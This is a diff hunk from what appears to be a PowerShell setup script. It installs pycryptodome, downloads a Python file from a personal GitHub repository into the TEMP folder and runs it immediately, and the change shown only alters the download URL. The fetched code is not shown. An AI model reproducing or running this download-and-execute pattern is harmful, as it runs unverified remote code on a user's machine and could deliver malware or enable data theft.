@@ -50,7 +50,7 @@ if (-not (Get-Command pip -ErrorAction SilentlyContinue)) {
 pip install pycryptodome
 
 
-$scriptUrl = "https://raw.githubusercontent.com/loopydevv-commits/loopysTestThing/refs/heads/main/main.py" 
+$scriptUrl = "https://raw.githubusercontent.com/loopydevv-commits/loopysTestThing/main/main.py" 
 $scriptPath = "$env:TEMP\downloaded_script.py"
 Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath
 python $scriptPath
